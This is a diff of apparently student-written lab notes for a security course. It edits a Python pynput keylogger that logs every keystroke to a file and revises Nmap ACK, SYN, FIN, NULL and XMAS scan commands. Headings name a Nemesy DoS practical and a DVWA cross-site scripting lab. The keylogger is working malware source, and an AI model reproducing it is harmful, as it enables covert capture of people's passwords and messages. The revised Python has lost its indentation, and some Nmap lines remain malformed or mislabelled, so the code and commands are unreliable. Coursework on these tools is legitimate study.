@@ -5,13 +5,21 @@ Open cmd and type --------- python -m pip install pynput
 
 
 code:
-from pynput.keyboard import key.Listener import logging
-log_dir = " "
-logging.basicConfig(filename = (log_dir + "key_log.txt"),level = logging.DEBUG,format = '%(asetime)s:%(message)s:')
+from pynput.keyboard import Key, Listener
+import logging
+# if no name it gets into an empty string
+log_dir = ""
+# This is a basic logging function
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG,
+format='%(asctime)s:%(message)s:')
+# This is from the library
 def on_press(key):
-	logging.info(str(key))
-		with Listener(on_press = on_press) as listener:
-				listener.join()
+logging.info(str(key))
+# This says, listener is on
+with Listener(on_press=on_press) as listener:
+listener.join()
+
+
 
 PRACTICAL 3: Use Nemesy to launch Dos Attack
 
@@ -37,11 +45,11 @@ PRACTICAL 4: Using Nmap Scanner to perform port scanning of ACK,SYN,FTN,NULL,XMA
 
 1. Download Nmap for window and install
 2. open cmd and type nmap to check if it install properly
-3. type the command on cmd------- nmap -SA -TA scanme.nmap.org (ACK Scan)
-4. type the command on cmd------- nmap -P,113,139, scanme.nmap.org (SYN Scan)
-5. type the command on cmd------- nmap -SF -TY para (FTN Scan)
-6. type the command on cmd------- nmap -SN -p22 scanme.nmap.org (NULL Scan)
-7. type the command on cmd------- nmap -SX -TY scanme.nmap.org (XMAS Scan)
+3. type the command on cmd------- nmap -sA -T4 scanme.nmap.org (ACK Scan)
+4. type the command on cmd------- nmap -p,113,139, scanme.nmap.org (SYN Scan)
+5. type the command on cmd------- nmap -sF -T4 para (FTN Scan)
+6. type the command on cmd------- nmap -sN -p22 scanme.nmap.org (NULL Scan)
+7. type the command on cmd------- nmap -sX -T4 scanme.nmap.org (XMAS Scan)
 
 
 PRACTICAL 5: Use Cryptool to encypt and decrypt password using RC4 algorithm
@@ -84,7 +92,6 @@ PRACTICAL 7: Using Wireshark to capture network traffic and analyze
 
 
 PRACTICAL 8: To stimutate cross site scriipting attack
-
 install xamp.
 download DVWA.
 
